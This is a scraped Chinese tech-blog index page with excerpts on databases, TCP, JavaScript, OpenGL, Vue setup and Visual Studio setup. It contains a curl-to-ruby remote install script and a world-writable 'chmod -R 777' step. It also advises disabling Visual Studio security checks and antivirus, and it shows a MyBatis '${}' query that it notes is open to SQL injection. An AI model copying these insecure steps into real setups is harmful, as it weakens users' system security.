为了解决这个问题引入Johnson不等式:
结论：先把所有作业的ai和bi放在一起， 从这之中选个最小的， 如果是bi的话这个作业i就放最后 ，如果是ai的话这个作业就放最前， 把这个已经安排好的作业从作业集中删除。 重复上述步骤即可。 源代码：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7ff8bd821d7d451712047164270ee47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea6dac01a1715da8c3b20a1da89eac07/" rel="bookmark">
			sqlserver的PIVOT和UNPIVOT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用PIVOT和UNPIVOT命令的SQL Server版本要求
1.数据库的最低版本要求为SQL Server 2005 或更高。
2.必须将数据库的兼容级别设置为90 或更高。
3.查看我的数据库版本及兼容级别。
select compatibility_level,* from sys.databases
修改方法1：exec sp_dbcmptlevel '库名', '80';
修改方法2: alter datebase database_name SET COMPATIBILITY_LEVEL = 80
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd670e51ce451622f872e3ccf715c686/" rel="bookmark">
			PMP 项目管理（01）引论 思维导图 解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章解读&amp;说明： PMBOK（第六版） 项目管理知识体系的解读主要分为以下部分：
PMP 项目管理 整体架构 思维导图 解读
PMP 项目管理（01）引论 思维导图 解读
PMP 项目管理（02）项目运行环境 思维导图 解读
PMP 项目管理（03）项目经理角色 思维导图 解读
PMP 项目管理（04）项目整合管理 思维导图 解读
PMP 项目管理（05）项目范围管理 思维导图 解读
PMP 项目管理（06）项目进度管理 思维导图 解读
PMP 项目管理（07）项目成本管理 思维导图 解读
PMP 项目管理（08）项目质量管理 思维导图 解读
PMP 项目管理（09）项目资源管理 思维导图 解读
PMP 项目管理（10）项目沟通管理 思维导图 解读
PMP 项目管理（11）项目风险管理 思维导图 解读
PMP 项目管理（12）项目采购管理 思维导图 解读
PMP 项目管理（13）项目相关方管理 思维导图 解读
本模块分享的内容： 引论
本章关键点总结 &amp; 说明： 本章节处于 PMBOK 第一部分 知识体系1中的框架，右上角 1 引论部分，内容展开如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd670e51ce451622f872e3ccf715c686/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f7dd127e556ff0c4f60ccbffbfe7872/" rel="bookmark">
			Mybatis的四种模糊查询的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 第一种写法：当调用的时候我们需要写%%或 “_”
select * from user where uname like #{like} 第二种写法 ：吧%%或者_ 卸载映射文件里，调用传参的时候，不需要写%了。
select * from user where uname like "%"#{like}"%" 第三种方法：使用sql拼接串，不能防止sql注入。
select * from user where uname like '%${value}% 第四种：时有mysql的cancat方法
select * from user where uname like CONCAT("%",#{s},"%") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6115479292a620a877e3531bb66e2ff3/" rel="bookmark">
			mysql 系统变量和用户变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
系统变量
全局变量
会话变量
用户变量
:=和=的区别
java中:=
系统变量 MySQL可以访问许多系统和连接变量。当服务器运行时许多变量可以动态更改。这样通常允许你修改服务器操作而不需要停止并重启服务器。
mysqld服务器维护两种变量。全局变量影响服务器整体操作。会话变量影响具体客户端连接的操作。
全局变量 当服务器启动时，它将所有全局变量初始化为默认值。这些默认值可以在选项文件中或在命令行中指定的选项进行更改。服务器启动后，通过连接服务器并执行SET GLOBAL var_name语句，可以动态更改这些全局变量。要想更改全局变量，必须具有SUPER权限。
对于全局变量的更改可以被访问该全局变量的任何客户端看见。然而，它只影响更改后连接的客户的从该全局变量初始化的相应会话变量。不影响目前已经连接的客户端的会话变量(即使客户端执行SET GLOBAL语句也不影响)。
可以使用几种语法形式来设置或检索全局或会话变量。下面的例子使用了sort_buffer_sizeas作为示例变量名。
要想设置一个GLOBAL变量的值，使用下面的语法：
mysql&gt; SET GLOBAL sort_buffer_size=value;
mysql&gt; SET @@global.sort_buffer_size=value;
要想检索一个GLOBAL变量的值，使用下面的语法：
mysql&gt; SELECT @@global.sort_buffer_size;
mysql&gt; SHOW GLOBAL VARIABLES like 'sort_buffer_size';
会话变量 服务器还为每个连接的客户端维护一系列会话变量。在连接时使用相应全局变量的当前值对客户端的会话变量进行初始化。对于动态会话变量，客户端可以通过SET SESSION var_name语句更改它们。设置会话变量不需要特殊权限，但客户端只能更改自己的会话变量，而不能更改其它客户端的会话变量。
要想设置一个SESSION变量的值，使用下面的语法：
mysql&gt; SET SESSION sort_buffer_size=value;
mysql&gt; SET @@session.sort_buffer_size=value;
mysql&gt; SET sort_buffer_size=value;
LOCAL是SESSION的同义词。
如果设置变量时不指定GLOBAL、SESSION或者LOCAL，默认使用SESSION。
要想检索一个SESSION变量的值，使用下面的语法：
mysql&gt; SELECT @@sort_buffer_size;
mysql&gt; SELECT @@session.sort_buffer_size;
mysql&gt; SHOW SESSION VARIABLES like 'sort_buffer_size';
这里，LOCAL也是SESSION的同义词。
当你用SELECT @@var_name搜索一个变量时(也就是说，不指定global.、session.或者local.)，MySQL返回SESSION值（如果存在），否则返回GLOBAL值。
对于SHOW VARIABLES，如果不指定GLOBAL、SESSION或者LOCAL，MySQL返回SESSION值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6115479292a620a877e3531bb66e2ff3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b127ff4e4ce9688eb9137424a85fbb71/" rel="bookmark">
			着色器配置的步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 着色器的配置大致需要如下几个步骤：
程序需要包含着色器的头文件，比如：&lt;shader.h&gt;创建并编译着色器对象，比如：Shader ourShader(“shader.vs”, “shader.fs”);在渲染循环中使用着色器，比如：ourShader.use(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/674b5b771170669f4b6c51b5b8bee3e2/" rel="bookmark">
			Fatal NI connect error 12547, connecting to:  (LOCAL=NO)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看日志发现以下报错 Fatal NI connect error 12547, connecting to:
(LOCAL=NO)
VERSION INFORMATION:
TNS for Linux: Version 11.2.0.4.0 - Production
Oracle Bequeath NT Protocol Adapter for Linux: Version 11.2.0.4.0 - Production
TCP/IP NT Protocol Adapter for Linux: Version 11.2.0.4.0 - Production
Time: 31-OCT-2019 05:38:37
Tracing not turned on.
Tns error struct:
ns main err code: 12547
TNS-12547: TNS:lost contact
ns secondary err code: 12560
nt main err code: 0
nt secondary err code: 0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/674b5b771170669f4b6c51b5b8bee3e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b998d65b8ac61b60cdbd53cb65f84afc/" rel="bookmark">
			关于图片文件旋转JPEG与EXIF信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于图片文件旋转JPEG与EXIF信息
比如某相机拍摄出来的相片，文件分辨率比如宽度7360像素，高度4912像素
十进制表示为 DEC : 7360 * 4912
十六进制则为 HEX : 1CC0 * 1330
默认情况下，会在00000030:07标志位（不同设备或程序生成的图片的标志位会有所不同，由EXIF内容而定）上存放01值表示原始文件的位置，无论这张图是横着拍的还是坚着拍的，初始值为01
那么图片，在Windows 10操作系统下，通过操作系统自带的“相片”程序进行旋转时，仅仅对此标志位进行改变，而图片的内容不会做任何改变，包括旋转后的宽度与高度也不会做改变，包括JPEG和EXIF中的宽度与高度信息。
1、向右旋转90度，标志位为06
2、再向右旋转90度，即旋转了180度，标志位为03
3、再向右旋转90度，即旋转了270度，标志位为08
4、再向右旋转90度，即旋转了360度，回到原图，标志位还原为01
然而，在Windows 10进行旋转的图片，如果在Windows XP或Windows 7上面通过“相片”进行查看仍然显示为未旋转前的图片，因为不识别这个标志位。
资源管理器在显示分辨率那一栏中也自然是无法识别，低版本的程序无法识别高版本的标志位导致的问题。
于是，在处理旋转过后的图片，通过JDK 8.0版本去读取javax.imageio.ImageIO.read(new File(fileName)).getWidth/getHeight宽度和高度时，也是无法获知到底是不是旋转过的。
包括其他比如HypeSnap 5.6.0版本的一些旧程序，在打开时都会由于不支持这种方式而导致仍是未旋转的问题。
但是，如果是在Windows XP或Windows 7当中，对图片文件进行旋转时，文件的内容做了全面的变化。旋转后的宽度与高度也会改变并保存到EXIF中，图片内容的改变。这样旋转后的文件在其他操作系统上进行打开时都是正确的旋转后的结果。
解法：比如新版本的HypeSnap 8.16.17版本已经可以支持这个特殊的标志位，能够正确识别并展现。
试过JDK 8.0/9.0/10.0均无法识别，目前最新版本的OpenJDK 13.0版本也没能识别出来旋转后的分辨率。
关于JPEG/EXIF文件格式说明
https://www.media.mit.edu/pia/Research/deepview/exif.html
Description of Exif file format
0x0112 Orientation unsigned short 1 The orientation of the camera relative to the scene, when the image was captured. The start point of stored data is, '1' means upper left, '3' lower right, '6' upper right, '8' lower left, '9' undefined.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b998d65b8ac61b60cdbd53cb65f84afc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42b9cffe7cd270b227f76515184d0076/" rel="bookmark">
			Wireshark 无法找到接口解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决方法:
下载安装WinPcap如果已安装,卸载后重新安装重启wireshark,看是否能找到本地接口如果仍然提示无法找到接口,关闭wireshark,将WinPcap卸载,安装npcap.重启wireshark会找到本地接口 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cfc2dffe76602d1cd7be90bc128628e/" rel="bookmark">
			TCP传输中的“三次握手”建立连接和“四次握手”释放连接过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP的连接管理主要面向三个连接阶段，分别是连接建立，传输数据，连接释放。
其中连接的建立和连接释放是两个重要的知识点，分别有两个比较形象的称呼：三次握手和四次握手。
最近正在学习传输层的知识，故借本文对这两个阶段进行简要整理。
首先必须明确的是TCP协议是采用客户/服务器的方式，主动发起连接建立的应用进程称为客户机，被动等待连接建立的应用进程称为服务器。
三次握手 一次连接建立的过程如下：
客户机首先向服务器发送一个TCP请求连接报文，报文不含应用层数据，比较值得注意的是就是报文首部字段，SYN = 1， seq = J；SYN=1表示这是一个请求连接报文，而seq = J 则是表示该报文段的序号，用于确保可靠传输（报文不携带数据但是仍然消耗一个序号）。服务器收到请求连接报文之后，若同意该请求，则为该TCP分配缓存，然后发送一个确认连接报文，其首部的字段分别为：SYN= 1，seq = K，ACK = 1， ack = J + 1;SYN=1表示这是一个连接接收报文，seq表示服务器发送报文的序号，ACK是确认位，而ack = J + 1则是表示服务端已经收到了J号报文，下一个报文希望接收的是序号为 J + 1的报文。当客户端接收到服务器的确认报文之后，需要再向服务端进行确认连接。这是再发送一个普通的确认报文即可。其ACK=1，ack = K+1. 这里值得注意的一个点就是，为什么不能一次或者两次握手就完成连接？
我们来假设一下，如果使用一次握手那么会存在什么样的问题？
服务端不同意请求或繁忙，但由于是一次握手，客户端不清楚服务器是否为其分配了缓存，这样就会导致后续的数据传输失效。
如果只使用二次握手，则会发生：
当服务器同意连接请求之后，发送接收确认报文后，客户端因为一些原因（如停机）导致无法传输数据，进而无法发送确认连接报文，那么服务端就会为这个掉线的客户端分配多余的资源，导致资源浪费。
四次握手 TCP的连接释放可以简单概括为两个阶段：
前两次握手是为了终止客户机到服务器的数据传输，但是服务器仍可以向客户机发送数据后两次握手是为了终止服务器向客户机发送数据。 四次握手的过程如下：
客户机向其TCP发出一个连接释放报文，其首部字段 FIN = 1，seq = u。当某一端发起一个附带FIN=1的报文时，则表示这一端终止发送数据，后续只能被动接收数据。服务器接收客户端释放报文，返回确认报文，其首部字段为 ACK=1，seq = v，ack = u + 1。这样从客户端到服务器的单向数据传输就终止了。但服务器仍然可以向客户端发送数据. 若服务端没有要向客户端发送的数据了，那么服务端发出连接释放报文，其首部字段 FIN = 1，ACK= 1，seq = w，ack = u + 1。客户机接收到连接释放报文之后，必须发出确认，其中ACK=1，seq = u + 1， ack = w + 1。此时TCP还未真正释放，必须经过时间等待计时器设置的时间2MSL后，客户端才进入关闭连接的状态。 这里需要清楚一点就是，为什么不能三次握手就完成连接的释放，即省略最后一步，确认报文。。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2cfc2dffe76602d1cd7be90bc128628e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70af12470a8332a6765929dac9f3d038/" rel="bookmark">
			JavaScript递归理解（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先举个栗子：求n个数字的和 n=5 -------&gt;5+4+3+2+1
function getSum(x) { if (x==1){ return 1 } return x+getSum(x-1); }; var sum=getSum(5); console.log(sum); console.log(getSum(10)); 执行过程：
代码执行getSum(5)—&gt;进入函数,此时的x是5,执行的是5+getSum(4),此时代码等待（即 5+getSum(4) 代码先不进行计算）；
先执行getSum(4),进入函数,执行的是4+getSum(3),等待；
先执行getSum(3),进入函数,执行3+getSum(2),等待；
先执行getSum(2),进入函数,执行 2+getSum(1);等待,
先执行getSum(1),执行x==1的判断,return 1,此时getSum(1)的结果是1,函数开始 往回执行 。
继续执行:
getSum(2)----&gt;2+getSum(1)此时的结果是2+1
getSum(3)----&gt;3+getSum(2) 此时的结果是3+2+1
getSum(4)----&gt;4+getSum(3) 此时的结果是4+3+2+1
getSum(5)----&gt;5+getSum(4) 此时的结果是5+4+3+2+1
在数学与计算机科学中，递归(Recursion)是指在函数的定义中使用函数自身的方法。顾名思义，其包含了两个意思：递 和 归。
递归就是有去（递去）有回（归来），如图所示。“有去”是指：递归问题必须可以分解为若干个规模较小，与原问题形式相同的子问题，这些子问题可以用相同的解题思路来解决。就像上面例子中的钥匙可以打开后面所有门上的锁一样，“有回”是指 : 这些问题的演化过程是一个从大到小，由近及远的过程，并且会有一个明确的终点(临界点)，一旦到达了这个临界点，就不用再往更小、更远的地方走下去。最后，从这个临界点开始，原路返回 到原点，原问题解决。
递归的基本思想就是把规模大的问题转化为规模小的相似的子问题来解决。特别地，在函数实现时，因为解决大问题的方法和解决小问题的方法往往是同一个方法，所以就产生了函数调用它自身的情况，这也正是递归的定义所在。格外重要的是，这个解决问题的函数必须 有明确的结束条件，否则就会导致无限递归的情况。
递归的数学模型其实就是 数学归纳法。数学归纳法适用于将解决原问题转化为解决它的子问题，而它的子问题又变成子问题的子问题，而且我们发现这些问题其实都是一个模型，也就是说存在 相同的逻辑 归纳处理项。当然有一个是例外的，也就是 归纳结束的那一个处理方法不适用于我们的归纳处理项 ，当然也不能适用，否则我们就无穷归纳了。总的来说，归纳法主要包含以下三个关键要素：
步进表达式：问题蜕变成子问题的表达式
结束条件：什么时候可以不再使用步进表达式（例外的处理）
直接求解表达式：在结束条件下能够直接计算返回值的表达式
事实上，这也正是某些数学中的数列问题在利用编程的方式去解决时可以使用递归的原因，比如著名的斐波那契数列问题。
递归的三要素： 1. 明确递归终止条件：递归就是有去有回，既然这样，那么必然应该有一个明确的临界点，程序一旦到达了这个临界点，就不用继续 往下递去 而是开始实实在在的 归来。换句话说，该临界点就是一种简单情境，可以防止无限递归。
2. 给出递归终止时的处理办法：在递归的临界点存在一种简单情境，在这种简单情境下，应该直接给出问题的解决方案。一般地，问题的解决方案是直观的、容易的。
3. 提取重复的逻辑，缩小问题规模：递归问题必须可以分解为若干个规模较小、与原问题形式相同的子问题，这些子问题可以用相同的解题思路来解决。从程序实现的角度而言，需要抽象出一个干净利落的重复的逻辑，以便使用相同的方式解决子问题。
递归算法的编程模型： 模型一： 在递去的过程中解决问题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70af12470a8332a6765929dac9f3d038/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/475703cff01fe3663523214eaf11e517/" rel="bookmark">
			钉钉实时拍照和上传图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 钉钉实时拍照&amp;图片上传功能的官方接口的使用 在项目中有个需求，基于Mint-UI做的钉钉微应用接口，有个功能是实时拍照的功能和既能拍照又能上传图片的功能
1：只允许拍照功能，接口：biz.util.uploadImageFromCamera 首先在使用钉钉接口时，需要现在main.js文件中，当配置好微应用的SDK之后，将所用功能接口注册，此项为必填项。
注意：需要使用的jsapi列表，注意：不要带dd。
再从该使用的函数里调用：点击拍照，并将图片上传，且穿给后台
selectImg(){//选择图片 var _this=this dd.biz.util.uploadImageFromCamera({ compression:true,//(是否压缩，默认为true) onSuccess : function(result) { _this.OA000103.push({WeChatServerId :result[0]}) }, onFail : function(err) { alert('调用图片上传：'+JSON.stringify(err)) } }) }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88fb76778560657e474b6d75ab4e52b5/" rel="bookmark">
			Linux 获取两个 csv 文件的交集和差集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 sort 差集
sort -m &lt;(sort big.csv | uniq) &lt;(sort small.csv | uniq) &lt;(sort small.csv | uniq) | uniq -u &gt; final.csv grep 交集
grep -F -f big.csv small.csv &gt; union_set.csv grep 差集
# 注意，是 big - small 的结果 grep -F -v -f small.csv big.csv &gt; difference_set.csv 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8486314c46ddb30a20398adcd772de00/" rel="bookmark">
			glBindFramebuffer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		void glBindFramebuffer( GLenum target,GLuint framebuffer); 参数 target ：指定绑定操作的帧缓冲区目标。 GL_DRAW_FRAMEBUFFER,GL_READ_FRAMEBUFFERGL_FRAMEBUFFER. If a framebuffer object is bound to GL_DRAW_FRAMEBUFFER or GL_READ_FRAMEBUFFER, it becomes the target for rendering or readback operations, respectively, until it is deleted or another framebuffer is bound to the corresponding bind point. Calling glBindFramebuffer with target set to GL_FRAMEBUFFER binds framebuffer to both the read and draw framebuffer targets.
framebuffer：指定要绑定的帧缓冲区对象的名称。 framebuffer is the name of a framebuffer object previously returned from a call to glGenFramebuffers,zero to break the existing binding of a framebuffer object to target.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8486314c46ddb30a20398adcd772de00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e31c812ea0e555fe634170d09aa78fb/" rel="bookmark">
			JSON.parse(JSON.stringify(obj))实现深拷贝的弊端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这句话待严谨：javaScript存储对象都是存地址的，所以浅拷贝会导致 obj1 和obj2 指向同一块内存地址。改变了其中一方的内容，都是在原来的内存上做修改会导致拷贝对象和源对象都发生改变，而深拷贝是开辟一块新的内存地址，将原对象的各个属性逐个复制进去。对拷贝对象和源对象各自的操作互不影响。
JSON.parse(JSON.stringify(obj))我们一般用来深拷贝，其过程说白了 就是利用JSON.stringify 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象；序列化的作用是存储(对象本身存储的只是一个地址映射，如果断电，对象将不复存在，因此需将对象的内容转换成字符串的形式再保存在磁盘上 )和传输（例如 如果请求的Content-Type是 application/x-www-form-urlencoded，则前端这边需要使用qs.stringify(data)来序列化参数再传给后端，否则后端接受不到； ps: Content-Type 为 application/json;charset=UTF-8或者 multipart/form-data 则可以不需要 ）。
我们在使用 JSON.parse(JSON.stringify(xxx))时应该注意一下几点：
1、如果obj里面有时间对象，则JSON.stringify后再JSON.parse的结果，时间将只是字符串的形式。而不是时间对象；
var test = { name: 'a', date: [new Date(1536627600000), new Date(1540047600000)], }; let b; b = JSON.parse(JSON.stringify(test)) 2、如果obj里有RegExp、Error对象，则序列化的结果将只得到空对象；
const test = { name: 'a', date: new RegExp('\\w+'), }; // debugger const copyed = JSON.parse(JSON.stringify(test)); test.name = 'test' console.error('ddd', test, copyed) 3、如果obj里有函数，undefined，则序列化的结果会把函数或 undefined丢失；
const test = { name: 'a', date: function hehe() { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e31c812ea0e555fe634170d09aa78fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76c7560af2da22c1504d53de43a09d8a/" rel="bookmark">
			macbook vue安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装 brew，这个简单，直接执行远程脚本
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
2、安装 nodejs，这一步时间可能略长（执行时间长短也有可能跟网络有关系）
brew install nodejs
3、获取nodejs模块安装目录访问权限
sudo chmod -R 777 /usr/local/lib/node_modules/
4、安装淘宝镜像，国内直接使用 npm 的官方镜像是非常慢的，所以这里使用淘宝 NPM 镜像
1）更改npm源：
npm config set registry https://registry.npm.taobao.org
（2）配置后可通过下面方式来验证是否成功，如果显示“https://registry.npm.taobao.org”则说明配置成功
npm config get registry
（3）然后安装淘宝的cnpm（如果该步骤报错“rollbackFailedOptional”，可以尝试执行步骤4或步骤5，否则跳过步骤4或步骤5）
npm install -g cnpm --registry=https://registry.npm.taobao.org
（4）先删除原有的所有代理，再重新安装淘宝的cnpm
npm config rm proxy npm config rm https-proxy npm install -g cnpm --registry=https://registry.npm.taobao.org
（5）报错“rollbackFailedOptional”，还可能是权限问题，用sudo执行：
sudo npm install -g cnpm --registry=https://registry.npm.taobao.org
以下是安装淘宝cnpm成功的结果：
MacBook-Pro:~ hu$ sudo npm install -g cnpm --registry=https://registry.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76c7560af2da22c1504d53de43a09d8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26acbafc90d4b6b016cc61e878391aa7/" rel="bookmark">
			请求无返回信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到问题总结 Response 信息： The request has no response data available 解决： 1.controller层内方法类似可加@RestController
2.在返回方法体上加 @ResponseBody
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44ebaadcef106bd5d2ff8c63317e212a/" rel="bookmark">
			VMware Workstation无法提供该虚拟机所需的所有图形功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息 ：VMware Workstation无法提供该虚拟机所需的所有图形功能。在该虚拟机引导后，图形硬件、图形驱动程序或Vware软件版本可能已发生变化。该虚拟机将继续运行，但在关闭该虚拟机之前，某些图形操作可能会出现不可预见的行为。
原因是在原来的vm中虚拟机是挂起的状态，所以在新的vm中打开就会出错。
解决方法：把虚拟机文件夹中的.vmss文件删掉就好啦?
参考链接 ：
https://www.cnblogs.com/changjue/p/11113481.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5460fb2ba0a35fc2ddb677dc6bbd9de7/" rel="bookmark">
			python上机——函数的应用及图形用户界面设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验目的和要求 1.掌握函数声明、定义及调用的方法。
2.掌握函数实际参数与形式参数的对应关系以及数据的“值传递”方式。
3.掌握递归的思想和递归调用的一般方法。
二、 实验数据记录、处理及结果分析 1、写出下列程序的运行结果。
def foo(num): for j in range(2,num//2+1): if num%j==0: return False else: return True def main(): n,c=8,0 for i in range(2,n+1): if foo(i): c+=i print(c) if __name__=='__main__': main() 2、下列程序的作用是求两个正整数m，n的最大公约数，请补充程序。
def gcd(m,n): if m&lt;n: m,n=n,m if m%n==0: ① else: return ② ans=gcd(84,342) print(ans) 补充程序为：
①return n，②gcd(n,m%n)
3、定义一个Circle类，根据圆的半径求周长和面积。再由Circle类创建两个圆对象，其半径分别为5和10，要求输出各自的周长和面积。
import math class Circle: def __init__(self,radius=5): self.radius=radius def getPerimeter(self): #返回圆的周长 return 2*math.pi*self.radius def getArea(self): #返回圆的面积 return math.pi*self.radius*self.radius c1=Circle() #创建两个圆对象 c2=Circle(10) print(c1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5460fb2ba0a35fc2ddb677dc6bbd9de7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1eb0ba3056cf278b7303d72282e47652/" rel="bookmark">
			屏幕映射以及四个变换的代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		屏幕映射 1 屏幕映射2 方法（GPU自动完成）1 z方向上的变化2 XOY平面的变化 3 四个变化的实现1 模型变换2 视图变换3 投影变换 4 PVM矩阵 1 屏幕映射 裁剪空间向屏幕空间的映射
裁剪空间：z∈[-1,1]，前截面是-1.后截面是1
屏幕空间: z∈[0,1],前截面是0，后截面是1；
2 方法（GPU自动完成） 1 z方向上的变化 2 XOY平面的变化 平移比例反向平移 3 四个变化的实现 1 模型变换 理论部分：6.2 三维模型，动起来
实践部分：OpenGL中用模型矩阵model来实现
glm::mat4 model(1);//定义model矩阵 model = glm::translate(model, glm::vec3(0.0f, 0.0f, -3.0f));//平移 model = glm::rotate(model,(float)glfwGetTime(),glm::vec3(0.0f, 1.0f, 0.0f));//旋转 model = glm::scale(model, glm::vec3(0.5, 0.5, 0.5)); //缩 2 视图变换 理论部分：6.3 观察者也能动
实践部分：OpenGL中用视图矩阵view来实现
glm::mat4 view(1); view=glm::lookAt(camera_position ,camera_position+camera_front, camera_up); //glm::LookAt函数的参数分别为一个摄像机位置、目标位置和摄像机上向量。 3 投影变换 理论部分：7.2 规范化的投影变换
实践部分：OpenGL中用视图矩阵projection来实现
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1eb0ba3056cf278b7303d72282e47652/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45b3a23bf1d75be360b4df3a851184e0/" rel="bookmark">
			10.29 1、Visual Studio IDE的安装、配置和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Visual Studio IDE的安装与使用:
学习重点:
Visual Studio IDE的安装.
Visual Studio IDE的使用.
Visual Studio IDE的安装:
1.什么是Visual Studio IDE:
Visual Studio是微软公司系列开发工具的总称,简称VS.IDE是集成开发环境(Integrated Development Environment)的英文缩写.Visual Studio IDE我们简称VS IDE(VS集成开发环境).
VS集成开发环境中集成了许多开发工具,包括最重要的三个组件:代码编辑器,编译器,调试器.
2.使用集成开发环境的优缺点:
优点: 操作简单,各种功能基本一键完成,开发效率高.
缺点: 不能直观的展示出各种功能的实现过程,不利于对基本原理的理解.函数基本原理 不太方便演示
VS IDE的使用:（以vs2013为例）
1.创建项目:
文件 -&gt; 新建 -&gt; 项目 -&gt;空项目 -&gt; 下一步 -&gt;
修改“项目名称”,更改项目保存“位置”,勾选“将解决方案和项目放在同一目录” -&gt; 创建 -&gt;
切记把 安全生命周期检查勾选取消掉。（Vs2019 默认打开）
#define _CRT_SECURE_NO_WARNINGS 关闭安全生命周期检查
修改存储位置
Vs2013 版本 新建项目
选择win 32控制台应用程序
关掉安全开发生命周期SDL检查
编译文件 时可能会报错，注意关掉杀毒软件的查杀，避开杀毒机制 编译文件可能不允许使用 项目完整运行
页面布局调整页面布局调整
对vs自带的窗口不满意的话可以进行调整。
头文件 源文件 依赖项目
2.添加项目文件:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45b3a23bf1d75be360b4df3a851184e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c4ba6e45adf2f36fddd316ec3eb8189/" rel="bookmark">
			BigDecimal做运算，保留小数位四舍五入取舍问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前言 1.1.BigDecimal主要做什么？ 源码中对其这样描述，
/** * An immutable arbitrary-precision signed decimal. * * &lt;p&gt;A value is represented by an arbitrary-precision "unscaled value" and a signed 32-bit "scale", * combined thus: {@code unscaled * 10&lt;sup&gt;-scale&lt;/sup&gt;}. See {@link #unscaledValue} and {@link #scale}. * * &lt;p&gt;Most operations allow you to supply a {@link MathContext} to specify a desired rounding mode. */ public class BigDecimal extends Number implements Comparable&lt;BigDecimal&gt;, Serializable { “一个不可变的任意精度带符号的小数…”,内部提供了做加减乘除和数值的精度计算
2.分析 2.1.1.使用 在new创建对象的时候有如上这么多种选择方式传参，这里在计算的时候传入的对象类型不能为double类型，应当用string类型，不是string类型使用String.
	</div>
	<div class="list__footer clearfix">
